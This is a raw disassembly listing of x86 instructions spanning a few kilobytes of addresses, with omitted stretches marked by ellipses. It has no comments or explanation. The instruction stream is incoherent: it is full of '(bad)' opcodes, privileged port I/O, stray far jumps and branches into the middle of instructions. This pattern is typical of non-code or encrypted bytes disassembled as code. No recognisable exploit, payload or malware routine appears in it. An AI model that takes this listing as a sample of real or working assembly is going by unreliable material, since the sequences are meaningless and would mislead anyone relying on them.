  4293ef:	jmp    0x97a0:0xd88f757a
  4293f6:	push   edx
  4293f7:	push   ebx
  4293f8:	xor    eax,0x9121eb02
  4293fd:	adc    eax,0x18d0a68e
  429402:	jno    0x429469
  429404:	jae    0x42944e
  429406:	test   al,0xfb
  429408:	and    al,0x71
  42940a:	ins    DWORD PTR es:[edi],dx
  42940b:	and    BYTE PTR [eax-0x63],0x22
  42940f:	fs out dx,eax
  429411:	fnstcw WORD PTR [edi-0x66]
  429414:	aaa    
  429415:	and    bl,BYTE PTR [esi-0x4d]
  429418:	pushf  
  429419:	gs xor eax,0x8e2c3bde
  42941f:	mov    ecx,DWORD PTR [eax]
  429421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429422:	pop    ebx
  429423:	mov    edx,0x3d636b9e
  429428:	retf   
  429429:	retf   0xdaa3
  42942c:	xchg   ecx,eax
  42942d:	adc    ecx,DWORD PTR [ebx]
  42942f:	push   eax
  429430:	sub    al,0x83
  429432:	inc    edi
  429433:	xchg   DWORD PTR [eax-0xa],eax
  429436:	cmp    eax,0x6c124614
  42943b:	jno    0x429425
  42943d:	mov    al,ds:0xcf5f4cca
  429442:	push   ecx
  429443:	add    ch,BYTE PTR [edi-0x64]
  429446:	sub    BYTE PTR [ebx+0x28cb8f3b],dh
  42944c:	adc    eax,DWORD PTR fs:[ebp+0x477f6a9b]
  429453:	jl     0x4293e2
  429455:	in     eax,0x65
  429457:	jp     0x4294bc
  429459:	inc    ebp
  42945a:	icebp  
  42945b:	jp     0x4294a9
  42945d:	(bad)  
  42945e:	iret   
  42945f:	push   0x22274ade
  429464:	adc    BYTE PTR [ecx],bh
  429466:	ret    
  429467:	mov    esi,0x8bdb36df
  42946c:	jge    0x4294c9
  42946e:	sbb    dl,ah
  429470:	push   edi
  429471:	push   es
  429472:	inc    ecx
  429473:	jle    0x42949e
  429475:	jae    0x429414
  429477:	fild   DWORD PTR [edx-0x7dc2e48c]
  42947d:	adc    ah,0xae
  429480:	(bad)  
  429481:	lods   eax,DWORD PTR ds:[esi]
  429482:	or     BYTE PTR [edi+ebx*2],ch
  429485:	arpl   bx,dx
  429487:	or     ah,ah
  429489:	das    
  42948a:	pop    ss
  42948b:	pop    esi
  42948c:	pop    ebp
  42948d:	jp     0x4294f5
  42948f:	lea    esp,[edx+0x64244f16]
  429495:	lock in al,0x93
  429498:	cmp    BYTE PTR [ebx-0x2e],ah
  42949b:	ja     0x429497
  42949d:	out    dx,al
  42949e:	push   esp
  42949f:	cmp    eax,ecx
  4294a1:	in     eax,0x5a
  4294a3:	daa    
  4294a4:	fxch   st(2)
  4294a6:	mov    al,fs:0x25ce79d7
  4294ac:	sbb    edx,ebp
  4294ae:	mov    edx,0x190b6660
  4294b3:	out    0x56,eax
  4294b5:	lahf   
  4294b6:	cli    
  4294b7:	cli    
  4294b8:	repz and DWORD PTR [ecx-0x12],ebx
  4294bc:	pop    eax
  4294bd:	stos   BYTE PTR es:[edi],al
  4294be:	scas   al,BYTE PTR es:[edi]
  4294bf:	dec    edx
  4294c0:	mov    ebp,0x3c69e6f4
  4294c5:	mov    eax,DWORD PTR [eax+0x1d9600e0]
  4294cb:	lds    edi,FWORD PTR [esi+0x41c327d8]
  4294d1:	vsubss xmm6,xmm1,DWORD PTR [edx-0x48703c23]
  4294d9:	jnp    0x429557
  4294db:	or     al,0x8b
  4294dd:	lahf   
  4294de:	dec    ecx
  4294df:	fcmovnb st,st(1)
  4294e1:	add    DWORD PTR [ecx+0x6a],0x42
  4294e5:	(bad)  [esi-0x8]
  4294e8:	jg     0x42948a
  4294ea:	add    al,0x8
  4294ec:	pop    eax
  4294ed:	outs   dx,DWORD PTR ds:[esi]
	...
  429556:	dec    esp
  429557:	or     eax,0x3e532c13
  42955c:	jg     0x4295cb
  42955e:	dec    esp
  42955f:	arpl   WORD PTR [ebp+0x247246ea],dx
  429565:	mov    ecx,0x1bb67
  42956a:	add    BYTE PTR [ecx],al
  42956c:	add    BYTE PTR [eax],al
  42956e:	mov    ch,0x64
  429570:	jae    0x4295a1
  429572:	ss sub al,0xf1
  429575:	xchg   eax,ecx
  429577:	bound  ecx,QWORD PTR [ebp-0x1e]
  42957a:	xlat   BYTE PTR ds:[ebx]
  42957b:	jb     0x429574
  42957d:	(bad)  
  42957e:	jne    0x4295cd
  429580:	imul   esp,ebx,0x13
  429583:	scas   al,BYTE PTR es:[edi]
  429584:	scas   al,BYTE PTR es:[edi]
  429585:	inc    edx
  429586:	sahf   
  429587:	clc    
  429588:	mov    edi,0x8e43739b
  42958d:	in     eax,dx
  42958e:	leave  
  42958f:	cwde   
  429590:	lea    ecx,[ecx+edx*1-0x2ace9e6c]
  429597:	test   BYTE PTR [eax+edi*8-0x6568ca3e],0x20
  42959f:	xchg   DWORD PTR [esi],ebp
  4295a1:	lock jbe 0x4295cf
  4295a4:	mov    esi,0xa280cc6d
  4295a9:	jle    0x4295ff
  4295ab:	mov    ecx,0x45d4770c
  4295b0:	or     ah,ah
  4295b2:	icebp  
  4295b3:	test   eax,0x3555e8e0
  4295b8:	out    0x6,al
  4295ba:	jne    0x4295e8
  4295bc:	jb     0x42961d
  4295be:	mov    edx,0xd651af5b
  4295c3:	xchg   ecx,eax
  4295c4:	or     cl,BYTE PTR [ebp-0x563f324d]
  4295ca:	shl    dl,cl
  4295cc:	and    eax,0xef995252
  4295d1:	mov    WORD PTR [edx],ds
  4295d3:	sbb    esi,DWORD PTR [eax+0x7f]
  4295d6:	inc    esi
  4295d7:	pop    ebp
  4295d8:	jbe    0x4295dc
  4295da:	out    0xcb,eax
  4295dc:	sbb    edx,edx
  4295de:	fsubr  DWORD PTR [ebp-0x5e79878]
  4295e4:	xor    ebp,DWORD PTR [edi]
  4295e6:	mov    al,0x18
  4295e8:	iret   
  4295e9:	pop    edx
  4295ea:	pushf  
  4295eb:	fiadd  WORD PTR [ebp+0x2a63993]
  4295f1:	das    
  4295f2:	adc    eax,0x3be39ac4
  4295f7:	pop    edx
  4295f8:	mov    esp,0xc16a6844
  4295fd:	dec    esp
  4295fe:	sbb    al,0xb9
  429600:	and    ebp,DWORD PTR [edx]
  429602:	shl    BYTE PTR [esi+0xf],0xaf
  429606:	test   DWORD PTR [edx-0x5e],ebx
  429609:	js     0x429602
  42960b:	push   ss
  42960c:	test   al,al
  42960e:	or     al,0xd4
  429610:	lock les ebx,FWORD PTR [edx]
  429613:	test   eax,0xee9c4ae6
  429618:	int    0xfd
  42961a:	out    dx,al
  42961b:	adc    eax,0xc60cf370
  429620:	jge    0x4295ae
  429622:	mov    bh,0x6d
  429624:	ret    0x8e7a
  429627:	mov    ebx,0x43efca04
  42962c:	out    dx,eax
  42962d:	leave  
  42962e:	leave  
  42962f:	sub    esp,esp
  429631:	fisttp QWORD PTR [edx+0x13]
  429634:	(bad)  
  429635:	data16 ror BYTE PTR [edi+0xfe34197],0x56
  42963d:	pop    ecx
  42963e:	test   al,0xa
  429640:	or     DWORD PTR [esp+edi*1-0x1c2a40c0],edi
  429647:	(bad)  
  429649:	aad    0xc2
  42964b:	aas    
  42964c:	mov    ch,0xb3
  42964e:	clc    
  42964f:	scas   eax,DWORD PTR es:[edi]
  429650:	sbb    al,0xeb
  429652:	stos   DWORD PTR es:[edi],eax
  429653:	dec    bl
  429655:	xchg   ebp,eax
  429656:	cmp    dh,BYTE PTR [edx+esi*4-0x39]
  42965a:	or     eax,0x9ea880ae
  42965f:	pop    ds
  429660:	push   eax
  429661:	and    BYTE PTR [ecx+0x40],cl
  429664:	xor    eax,edx
  429666:	mov    cl,0xa0
  429668:	lods   al,BYTE PTR ds:[esi]
  429669:	iret   
  42966a:	mov    ch,0x79
  42966c:	push   esp
  42966d:	sldt   WORD PTR [eax]
	...
  4296d4:	add    BYTE PTR [eax],al
  4296d6:	ins    DWORD PTR es:[edi],dx
  4296d7:	sbb    eax,0xfbf6c0e6
  4296dc:	outs   dx,DWORD PTR ds:[esi]
  4296dd:	mov    ebp,0xab7b5cea
  4296e2:	std    
  4296e3:	mov    bh,0xc5
  4296e5:	inc    esi
  4296e6:	addr16 mov esp,0x1000001
  4296ec:	add    BYTE PTR [eax],al
  4296ee:	or     edi,DWORD PTR [ecx+0xd]
  4296f1:	fs retf 
  4296f3:	ficomp DWORD PTR [ebx]
  4296f5:	inc    ebx
  4296f6:	into   
  4296f7:	pop    edi
  4296f8:	pop    ds
  4296f9:	test   eax,0xba7c5716
  4296fe:	or     eax,0x62216dd0
  429703:	inc    eax
  429704:	ficomp DWORD PTR [esi+0x48b7883f]
  42970a:	mov    edi,0x246df39d
  42970f:	inc    esp
  429710:	inc    edx
  429711:	rol    DWORD PTR [edx+0x24],cl
  429714:	test   DWORD PTR [eax+0x15],esi
  429717:	jp     0x429719
  429719:	add    al,0xd2
  42971b:	mov    eax,ds:0x96fa09e0
  429720:	or     DWORD PTR [eax-0x5e],0x4c
  429724:	outs   dx,DWORD PTR ds:[esi]
  429725:	mov    ebx,0xe06cff5
  42972a:	and    DWORD PTR [ebx+0x34],ebp
  42972d:	mov    BYTE PTR [edi+eax*8],cl
  429730:	ins    BYTE PTR es:[edi],dx
  429731:	(bad)  
  429732:	push   0x6de0396d
  429737:	push   ecx
  429738:	ret    
  429739:	ins    DWORD PTR es:[edi],dx
  42973a:	adc    BYTE PTR [edi],bl
  42973c:	mov    dh,0xce
  42973e:	and    BYTE PTR ds:0x28ac99ae,dl
  429744:	cli    
  429745:	cmp    DWORD PTR [ecx],eax
  429747:	out    dx,al
  429748:	xor    BYTE PTR [ebp-0xd00114c],cl
  42974e:	sti    
  42974f:	icebp  
  429750:	mov    ah,BYTE PTR [edx]
  429752:	mov    ah,0x8b
  429754:	out    0x51,al
  429756:	mov    bl,0x8f
  429758:	and    eax,0xc3626d98
  42975d:	lods   eax,DWORD PTR ds:[esi]
  42975e:	iret   
  42975f:	stos   DWORD PTR es:[edi],eax
  429760:	repz sbb al,BYTE PTR [ebx-0x65]
  429764:	inc    esp
  429765:	cli    
  429766:	es dec ecx
  429768:	imul   ebx,DWORD PTR [esi-0x3ed6e22a],0xc5be1155
  429772:	and    DWORD PTR [esi+0x4c646a53],edi
  429778:	sub    al,0xff
  42977a:	(bad)  ds:0x2362dc18
  429780:	pusha  
  429781:	ins    BYTE PTR es:[edi],dx
  429782:	xor    bh,0x4b
  429785:	jmp    0x429747
  429787:	in     eax,0x56
  429789:	or     cl,BYTE PTR [ebp+eax*8-0x3]
  42978d:	je     0x429751
  42978f:	icebp  
  429790:	mov    eax,eax
  429792:	stos   DWORD PTR es:[edi],eax
  429793:	stc    
  429794:	sbb    ebx,ecx
  429796:	scas   al,BYTE PTR es:[edi]
  429797:	call   esp
  429799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42979a:	shl    DWORD PTR [esi-0x17b7d681],cl
  4297a0:	nop
  4297a1:	push   edi
  4297a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297a3:	sbb    DWORD PTR cs:[ecx+0x29c8ee8d],ecx
  4297aa:	popa   
  4297ab:	or     edx,DWORD PTR [edi+eiz*2-0x9891c05]
  4297b2:	mov    ds:0xa777e6ee,al
  4297b7:	(bad)  
  4297b8:	jbe    0x42982a
  4297ba:	dec    esp
  4297bb:	loopne 0x429831
  4297bd:	push   ds
  4297be:	nop
  4297bf:	jns    0x42978b
  4297c1:	pop    ss
  4297c2:	push   ecx
  4297c3:	lahf   
  4297c4:	mov    eax,0xebc1b63f
  4297c9:	and    bh,al
  4297cb:	shl    DWORD PTR [eax],1
  4297cd:	sub    dh,bh
  4297cf:	inc    ebp
  4297d0:	or     edi,ebp
  4297d2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4297d4:	(bad)  
  4297d6:	xor    DWORD PTR [ebp+0x3be8187b],0xffffffa0
  4297dd:	arpl   WORD PTR [ecx],di
  4297df:	jp     0x42983a
  4297e1:	or     dl,BYTE PTR [esi+0x6d300334]
  4297e7:	int3   
  4297e8:	arpl   dx,si
  4297ea:	mov    ch,0x12
  4297ec:	xchg   ebp,eax
  4297ed:	push   ds
	...
  429856:	xor    BYTE PTR [edx-0x21],al
  429859:	(bad)  
  42985a:	(bad)  
  42985b:	(bad)  
  42985c:	mov    ebp,0x1d164c52
  429861:	pop    ebp
  429862:	sbb    edi,DWORD PTR [edx+0x59]
  429865:	shl    DWORD PTR [edi-0x43],0x1
  429869:	add    BYTE PTR [eax],al
  42986b:	add    DWORD PTR [eax],eax
  42986d:	add    BYTE PTR [ebx-0x29],ch
  429870:	mov    edi,ds
  429872:	inc    esp
  429873:	jmp    0x4298ae
  429875:	rcl    BYTE PTR [eax+0x7b],cl
  429878:	push   0x60e88a66
  42987d:	mov    edi,DWORD PTR [edi-0x33b81661]
  429883:	mov    edi,0xc9d74563
  429888:	xor    bl,BYTE PTR [ebp-0x2b76cf9f]
  42988e:	inc    esi
  42988f:	push   ss
  429890:	sar    BYTE PTR [ebp-0x7390e37],0xa
  429897:	nop
  429898:	hlt    
  429899:	or     eax,0xdef796be
  42989e:	sub    edi,DWORD PTR [ecx-0x75bb90b8]
  4298a4:	ins    BYTE PTR es:[edi],dx
  4298a5:	cmp    BYTE PTR [esi-0x2703fe0d],bl
  4298ab:	add    DWORD PTR [edi],0x35
  4298ae:	xor    al,0x6c
  4298b0:	sub    esi,esp
  4298b2:	xor    edi,DWORD PTR [edi+0x4d]
  4298b5:	stos   BYTE PTR es:[edi],al
  4298b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298b7:	push   eax
  4298b8:	daa    
  4298b9:	(bad)  
  4298bb:	jbe    0x429927
  4298bd:	xor    BYTE PTR [edx],ch
  4298bf:	loop   0x429933
  4298c1:	sub    ecx,esi
  4298c3:	mov    WORD PTR [edx+0x114062b0],cs
  4298c9:	shl    DWORD PTR [eax-0x1b],0xc8
  4298cd:	popa   
  4298ce:	sbb    ecx,0x4526afac
  4298d4:	cmp    al,0xd9
  4298d6:	scas   al,BYTE PTR es:[edi]
  4298d7:	pop    ecx
  4298d8:	or     eax,0x7b7a9bec
  4298dd:	sbb    BYTE PTR [ecx+0x1da4c787],0xef
  4298e4:	aaa    
  4298e5:	cmp    al,0x26
  4298e7:	mov    ah,0xc6
  4298e9:	(bad)  
  4298eb:	ror    BYTE PTR [ecx+0x3fd35786],cl
  4298f1:	ffreep st(1)
  4298f3:	ret    0xd8a
  4298f6:	sbb    al,0xcb
  4298f8:	cmp    eax,0x5af25b98
  4298fd:	in     al,0x84
  4298ff:	sub    eax,0xd55443f8
  429904:	inc    esi
  429905:	adc    al,0x78
  429907:	and    BYTE PTR [ecx+0x9],bl
  42990a:	jne    0x42993d
  42990c:	retf   
  42990d:	xor    DWORD PTR [ecx+0x108717e1],0x8858451e
  429917:	push   edx
  429918:	mov    ebp,DWORD PTR [ebx+0x6c2b52a5]
  42991e:	out    dx,al
  42991f:	pop    es
  429920:	inc    esi
  429921:	(bad)  
  429922:	outs   dx,DWORD PTR ds:[esi]
  429923:	daa    
  429924:	ins    BYTE PTR es:[edi],dx
  429925:	inc    edx
  429926:	jge    0x429975
  429928:	aad    0xdf
  42992a:	sbb    BYTE PTR [esi-0x499e3c98],0xd4
  429931:	addr16 push es
  429933:	pop    eax
  429934:	test   BYTE PTR [ebp+edx*1+0x13],0x3b
  429939:	loope  0x429904
  42993b:	inc    ebp
  42993c:	int3   
  42993d:	xchg   esi,eax
  42993e:	xor    dl,cl
  429940:	hlt    
  429941:	mov    ah,0x18
  429943:	pop    esi
  429944:	fcmovbe st,st(6)
  429946:	add    DWORD PTR ds:0xe48a8da,ebx
  42994c:	cmp    ah,BYTE PTR [ebx-0xa]
  42994f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429950:	inc    esp
  429951:	daa    
  429952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429953:	jle    0x42999b
  429955:	xor    ecx,DWORD PTR [edx]
  429957:	adc    DWORD PTR [ecx-0x26fb99a8],ebx
  42995d:	pop    eax
  42995e:	das    
  42995f:	cmp    eax,DWORD PTR [eax+0x3f]
  429962:	in     al,dx
  429963:	push   esp
  429964:	xor    BYTE PTR [eax+0xebe9af7],0xf4
  42996b:	xor    esi,eax
  42996d:	ins    DWORD PTR es:[edi],dx
	...
  4299d6:	push   edi
  4299d7:	push   0xdf7fdf64
  4299dc:	(bad)  
  4299dd:	call   0x3b7e6dd5
  4299e2:	inc    esp
  4299e3:	xchg   ebx,eax
  4299e4:	aam    0xa9
  4299e6:	addr16 mov esi,0x1000001
  4299ec:	add    BYTE PTR [eax],al
  4299ee:	pop    edx
  4299ef:	cmp    BYTE PTR [eax],dl
  4299f1:	nop
  4299f2:	js     0x4299ea
  4299f4:	stos   BYTE PTR es:[edi],al
  4299f5:	cmp    ebp,DWORD PTR [ebx+0x23]
  4299f8:	adc    al,0xea
  4299fa:	aam    0x1d
  4299fc:	mov    bh,0x92
  4299fe:	jecxz  0x429a07
  429a00:	cmp    eax,0xef144af5
  429a05:	jp     0x429a32
  429a07:	out    0x3a,eax
  429a09:	test   DWORD PTR ds:0x3cf2508d,ebp
  429a0f:	xor    DWORD PTR [edx],edi
  429a11:	rcr    esi,0xad
  429a14:	into   
  429a15:	pusha  
  429a16:	fcmovbe st,st(3)
  429a18:	scas   al,BYTE PTR es:[edi]
  429a19:	repnz mov eax,ds:0x83f9b731
  429a1f:	xchg   esi,eax
  429a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a21:	aaa    
  429a22:	adc    dh,bl
  429a24:	xchg   DWORD PTR [edi+0x2c],esp
  429a27:	das    
  429a28:	jp     0x429aa9
  429a2a:	ins    BYTE PTR es:[edi],dx
  429a2b:	pop    es
  429a2c:	pop    ebp
  429a2d:	scas   eax,DWORD PTR es:[edi]
  429a2e:	rcr    edi,1
  429a30:	and    esp,DWORD PTR [edx-0x60]
  429a33:	(bad)  
  429a34:	data16 test al,0xee
  429a37:	pop    ebp
  429a38:	loopne 0x429a2c
  429a3a:	popf   
  429a3b:	dec    edx
  429a3c:	xor    eax,0x51294a30
  429a42:	pop    edx
  429a43:	or     al,0x59
  429a45:	jae    0x429a6a
  429a47:	or     eax,0xa116c4cf
  429a4c:	xor    eax,0x6b40ded8
  429a51:	outs   dx,BYTE PTR ds:[esi]
  429a52:	jno    0x429a05
  429a54:	xor    ch,BYTE PTR [ebx-0x28]
  429a57:	test   BYTE PTR [edx+0x5958a0b4],cl
  429a5d:	ret    
  429a5e:	aas    
  429a5f:	sbb    bh,BYTE PTR [ebx-0x2d4dc558]
  429a65:	sbb    DWORD PTR [ebx+0xbfdd2ae],0xfffffff3
  429a6c:	jmp    0x6fe3:0x66cabafa
  429a73:	icebp  
  429a74:	repnz lods al,BYTE PTR ds:[esi]
  429a76:	dec    ebp
  429a77:	adc    al,0x6b
  429a79:	or     BYTE PTR ds:0xf1f722c5,bl
  429a7f:	jl     0x429ad6
  429a81:	jne    0x429a6b
  429a83:	xchg   ebp,eax
  429a84:	in     al,dx
  429a85:	sub    eax,0x32d1d0c8
  429a8a:	or     eax,0xd4881e1a
  429a8f:	ret    0x60b0
  429a92:	inc    esi
  429a93:	ss sbb dh,BYTE PTR ds:[esi+0x57]
  429a98:	push   es
  429a99:	mov    ch,0x6
  429a9b:	aaa    
  429a9c:	scas   eax,DWORD PTR es:[edi]
  429a9d:	xchg   edx,eax
  429a9e:	cmp    ah,BYTE PTR [edx]
  429aa0:	and    DWORD PTR [edi-0x1eeddfdc],0xac0fa6c0
  429aaa:	fcom   QWORD PTR [ebx+0x2f2349e3]
  429ab0:	xor    dl,BYTE PTR [ebx+0x5d]
  429ab3:	lods   eax,DWORD PTR ds:[esi]
  429ab4:	sbb    esi,0x104fbed0
  429aba:	xchg   ecx,eax
  429abb:	mov    esp,0xa300afa6
  429ac0:	inc    ebp
  429ac1:	or     al,0xde
  429ac3:	imul   ecx,DWORD PTR [edi+edx*4-0x1fe212a9],0xb9a4924d
  429ace:	fstp   DWORD PTR [edx+edi*4]
  429ad1:	dec    ebx
  429ad2:	iret   
  429ad3:	and    eax,0x314d9e6c
  429ad8:	repz add esp,edi
  429adb:	mov    gs,ebx
  429add:	jle    0x429a94
  429adf:	gs lahf 
  429ae1:	sbb    eax,DWORD PTR [ecx+0xc]
  429ae4:	ja     0x429b1a
  429ae6:	sahf   
  429ae7:	stos   BYTE PTR es:[edi],al
  429ae8:	lahf   
  429ae9:	adc    esp,ecx
  429aeb:	jmp    0x434e44
	...
  429b54:	add    BYTE PTR [eax],al
  429b56:	into   
  429b57:	std    
  429b58:	sti    
  429b59:	leave  
  429b5a:	sti    
  429b5b:	iret   
  429b5c:	(bad)  
  429b5d:	jmp    DWORD PTR ds:0x17a95667
  429b63:	jle    0x429b04
  429b65:	repz addr16 mov edi,0x1000001
  429b6c:	add    BYTE PTR [eax],al
  429b6e:	lock inc eax
  429b70:	in     eax,dx
  429b71:	mov    WORD PTR [ecx],cs
  429b73:	(bad)  
  429b74:	xlat   BYTE PTR ds:[ebx]
  429b75:	outs   dx,DWORD PTR ds:[esi]
  429b76:	dec    edx
  429b77:	and    DWORD PTR [esi-0x65],ebp
  429b7a:	mov    gs,WORD PTR [ecx+0x73192692]
  429b80:	pop    esi
  429b81:	mov    ecx,0xa2f389c3
  429b86:	inc    ecx
  429b87:	test   esi,ebp
  429b89:	out    dx,al
  429b8a:	(bad)  
  429b8b:	in     eax,0xe3
  429b8d:	dec    ah
  429b8f:	mov    eax,ds:0xf82e2707
  429b94:	add    al,ah
  429b96:	es ins BYTE PTR es:[edi],dx
  429b98:	pop    ebp
  429b99:	sub    bh,ah
  429b9b:	int3   
  429b9c:	cmp    al,0xb3
  429b9e:	mov    ah,0x8d
  429ba0:	fidivr DWORD PTR [ecx+edi*8+0x5a]
  429ba4:	shl    BYTE PTR [ebx+0x2a],1
  429ba7:	xor    DWORD PTR [esi+0x5f],edx
  429baa:	mov    BYTE PTR [esi+0x35bf4a],al
  429bb0:	shl    DWORD PTR [ecx+ebx*1+0x63],0x4b
  429bb5:	popa   
  429bb6:	daa    
  429bb7:	inc    edx
  429bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bb9:	in     al,dx
  429bba:	ret    
  429bbb:	mov    eax,0xcd980157
  429bc0:	push   ss
  429bc1:	in     al,0x2c
  429bc3:	aad    0x66
  429bc5:	dec    eax
  429bc7:	push   edx
  429bc8:	pop    ebx
  429bc9:	lea    edx,[eax-0x5b1d0e62]
  429bcf:	mov    ah,0x2f
  429bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bd2:	fwait
  429bd3:	(bad)  
  429bd4:	jmp    0x34ae:0xae5ba2ae
  429bdb:	mov    ds:0xc4f8632f,al
  429be0:	xchg   esi,eax
  429be1:	inc    ecx
  429be2:	add    dh,BYTE PTR [ecx+ebx*4+0x45b0537a]
  429be9:	les    edi,FWORD PTR [ebp+0x25bcdfd1]
  429bef:	jmp    0x4b6475db
  429bf4:	arpl   WORD PTR ds:0x905910b0,si
  429bfa:	xor    ch,cl
  429bfc:	xchg   ecx,esp
  429bfe:	mov    dh,0x4f
  429c00:	(bad)  
  429c01:	pop    esi
  429c02:	jle    0x429be7
  429c04:	in     eax,0xe9
  429c06:	push   ebx
  429c07:	mov    al,0x83
  429c09:	shl    ch,0xa8
  429c0c:	sar    BYTE PTR [ebx-0x524e5a4a],1
  429c12:	cmp    al,0x74
  429c14:	ins    BYTE PTR es:[edi],dx
  429c15:	mov    dh,0x1a
  429c17:	jno    0x429bc5
  429c19:	inc    esi
  429c1a:	mov    esi,esi
  429c1c:	push   0xffffffc3
  429c1e:	out    dx,al
  429c1f:	cmp    edi,DWORD PTR [edx]
  429c21:	popa   
  429c22:	in     eax,dx
  429c23:	xchg   esp,eax
  429c24:	push   0xffffffc2
  429c26:	inc    eax
  429c27:	int    0x36
  429c29:	retf   0x4917
  429c2c:	test   al,0x2e
  429c2e:	jne    0x429c5b
  429c30:	shl    DWORD PTR [ebp+edx*2+0x51f5f0b],cl
  429c37:	retf   
  429c38:	mov    ds:0xe88542de,al
  429c3d:	cmp    ebp,DWORD PTR [edx]
  429c3f:	inc    ecx
  429c40:	pop    esi
  429c41:	gs scas al,BYTE PTR es:[edi]
  429c43:	cmp    esp,esi
  429c45:	or     bh,bl
  429c47:	mov    ebp,0xe48bfcaf
  429c4c:	inc    cl
  429c4e:	repnz iret 
  429c50:	push   ds
  429c51:	ds mov bl,ah
  429c54:	push   ds
  429c55:	rcr    BYTE PTR [eax+0x540d0546],1
  429c5b:	mov    esi,0x701bd463
  429c60:	xor    DWORD PTR [edx],ebx
  429c62:	mov    esi,0x177dd545
  429c67:	and    eax,0x8178e057
  429c6c:	and    edi,ecx
	...
  429cd6:	mov    ds:0xb788a616,eax
  429cdb:	mov    eax,0x89413faf
  429ce0:	(bad)  
  429ce1:	xor    BYTE PTR [ebp-0x2e],bh
  429ce4:	xor    dl,dh
  429ce6:	rol    BYTE PTR [bx+di],0x0
  429cea:	add    BYTE PTR [ecx],al
  429cec:	add    BYTE PTR [eax],al
  429cee:	(bad)  
  429cf0:	mov    BYTE PTR [ebp+eiz*4+0x5362d84],ch
  429cf7:	mov    ebp,0x2328ffea
  429cfc:	(bad)  
  429cfe:	das    
  429cff:	fiadd  DWORD PTR [ebx+0x1e]
  429d02:	pcmpeqw mm7,mm6
  429d05:	dec    eax
  429d06:	sbb    ecx,DWORD PTR [esi]
  429d08:	fst    QWORD PTR ds:0x2d601588
  429d0e:	neg    ah
  429d10:	(bad)  
  429d11:	jb     0x429d19
  429d13:	mov    al,0xfa
  429d15:	out    dx,al
  429d16:	mov    ebp,DWORD PTR [edx]
  429d18:	out    dx,eax
  429d19:	test   BYTE PTR [ebp+0x326185d2],0x2
  429d20:	clc    
  429d21:	jp     0x429d23
  429d23:	jbe    0x429d67
  429d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d26:	out    0x7b,eax
  429d28:	push   edi
  429d29:	sti    
  429d2a:	and    BYTE PTR [ebx],cl
  429d2c:	aaa    
  429d2d:	sub    ecx,DWORD PTR [eax]
  429d2f:	push   ss
  429d30:	xchg   ebp,eax
  429d31:	(bad)  
  429d32:	push   edi
  429d33:	mov    ds:0x2cbbf1fb,al
  429d38:	scas   al,BYTE PTR es:[edi]
  429d39:	mov    cl,0x8
  429d3b:	dec    edi
  429d3c:	bound  edx,QWORD PTR [ebx]
  429d3e:	inc    edx
  429d3f:	xchg   esi,eax
  429d40:	xlat   BYTE PTR ds:[ebx]
  429d41:	in     eax,dx
  429d42:	jp     0x429cde
  429d44:	fwait
  429d45:	inc    ebx
  429d46:	shl    DWORD PTR [ecx],cl
  429d48:	nop
  429d49:	test   DWORD PTR [ecx],0xb91b636f
  429d4f:	or     DWORD PTR [esi+0x1a],0x4c
  429d53:	int    0x89
  429d55:	lock jne 0x429d77
  429d58:	leave  
  429d59:	in     eax,dx
  429d5a:	adc    ebx,esp
  429d5c:	jne    0x429ce8
  429d5e:	jae    0x429d6c
  429d60:	aam    0xf9
  429d62:	mov    ds:0x8356b5bd,eax
  429d67:	sbb    al,0xe6
  429d69:	stos   DWORD PTR es:[edi],eax
  429d6a:	shl    BYTE PTR [ecx],cl
  429d6c:	mov    ebp,0xb23595ed
  429d71:	mov    ds:0x8800012c,eax
  429d76:	sbb    BYTE PTR [esi-0x1c16c213],ah
  429d7c:	pop    ds
  429d7d:	imul   ebx,DWORD PTR ds:0x7c66c9ed,0xe61f1efe
  429d87:	sub    esi,DWORD PTR [ebx+0x64]
  429d8a:	ret    
  429d8b:	pop    ebx
  429d8c:	test   eax,0xf1ff3ae2
  429d91:	dec    edi
  429d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d93:	repnz scas al,BYTE PTR es:[edi]
  429d95:	cmovae edx,DWORD PTR [eax]
  429d98:	add    eax,0xc91b2c9b
  429d9d:	stos   DWORD PTR es:[edi],eax
  429d9e:	aas    
  429d9f:	call   0x8ca7369e
  429da4:	sub    eax,0x8d47c0bb
  429da9:	fwait
  429daa:	test   al,0xbd
  429dad:	icebp  
  429dae:	and    edx,0x32e747c8
  429db4:	repz dec edi
  429db6:	dec    esp
  429db7:	pop    ss
  429db8:	stos   BYTE PTR es:[edi],al
  429db9:	ins    BYTE PTR es:[edi],dx
  429dba:	pop    ds
  429dbb:	popf   
  429dbc:	clc    
  429dbd:	lock sub DWORD PTR [ebx-0x78],ebx
  429dc1:	ins    DWORD PTR es:[edi],dx
  429dc2:	xlat   BYTE PTR ds:[ebx]
  429dc3:	out    0x4b,al
  429dc5:	push   ebx
  429dc6:	or     ebx,DWORD PTR [edx+edi*8]
  429dc9:	mov    BYTE PTR [ecx-0x675da0b4],al
  429dcf:	add    al,0x7a
  429dd1:	push   ds
  429dd2:	popf   
  429dd3:	mov    ecx,DWORD PTR [ecx-0x60]
  429dd6:	in     al,0x43
  429dd8:	or     BYTE PTR [eax],dh
  429dda:	loop   0x429e10
  429ddc:	fcom   DWORD PTR [bx+di]
  429ddf:	mov    eax,0xf7a0978b
  429de4:	inc    ebp
  429de5:	sub    BYTE PTR [edi+0x1354dae7],cl
  429deb:	sar    bh,0x84
	...
  429e56:	fwait
  429e57:	mov    bh,0xc4
  429e59:	or     al,0xec
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	dec    edi
  429e63:	out    dx,al
  429e64:	repnz in eax,0x67
  429e67:	rol    DWORD PTR [ecx],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	pushf  
